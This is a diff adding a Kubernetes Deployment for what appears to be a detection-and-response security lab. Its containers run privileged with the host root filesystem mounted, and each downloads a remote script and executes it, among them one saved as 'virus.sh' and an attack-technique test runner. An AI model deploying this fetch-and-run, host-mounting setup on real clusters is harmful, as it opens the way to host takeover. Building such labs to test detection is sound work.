@@ -1,0 +1,88 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: alpine-cdr-deployment
+  labels:
+    app: alpine-cdr
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: alpine-cdr
+  template:
+    metadata:
+      labels:
+        app: alpine-cdr
+    spec:
+      containers:
+      - name: malicous-container
+        image: alpine:latest
+        securityContext:
+          privileged: true
+          capabilities:
+            add:
+              - SYS_ADMIN
+              - NET_ADMIN
+        volumeMounts:
+          - name: host
+            mountPath: /host
+        command:
+          - /bin/sh
+          - -c
+          - |
+            wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/malicous-container/malicous-container.sh -O virus.sh && \
+            chmod +x virus.sh && \
+            sh virus.sh && \
+            sleep 3600
+
+      - name: atk-ttp-test-runner
+        image: alpine:latest
+        securityContext:
+          privileged: true
+          capabilities:
+            add:
+              - SYS_ADMIN
+              - NET_ADMIN
+        volumeMounts:
+          - name: host
+            mountPath: /host
+        command:
+          - /bin/sh
+          - -c
+          - |
+            wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/build-files/atk-ttp-test.sh -O atk-ttp-test.sh && \
+            chmod +x atk-ttp-test.sh && \
+            ./atk-ttp-test.sh && \
+            sleep 3600
+
+      - name: suid-detection-container
+        image: ubuntu:20.04
+        securityContext:
+          privileged: true
+          capabilities:
+            add:
+              - SYS_ADMIN
+              - AUDIT_CONTROL
+        volumeMounts:
+          - name: host
+            mountPath: /host
+        command:
+          - /bin/bash
+          - -c
+          - |
+            apt-get update && \
+            apt-get install -y auditd inotify-tools wget && \
+            mkdir -p /mnt/shared && \
+            # Bind the host's /tmp directory as the shared directory inside the container
+            mount --bind /host/tmp /mnt/shared && \
+            # Download the SUID detection script (update URL if needed)
+            wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/build-files/suid_script.sh -O /usr/local/bin/suid_script.sh && \
+            chmod +x /usr/local/bin/suid_script.sh && \
+            /usr/local/bin/suid_script.sh detect && \
+            tail -f /dev/null
+
+      volumes:
+        - name: host
+          hostPath:
+            path: /
+            type: Directory
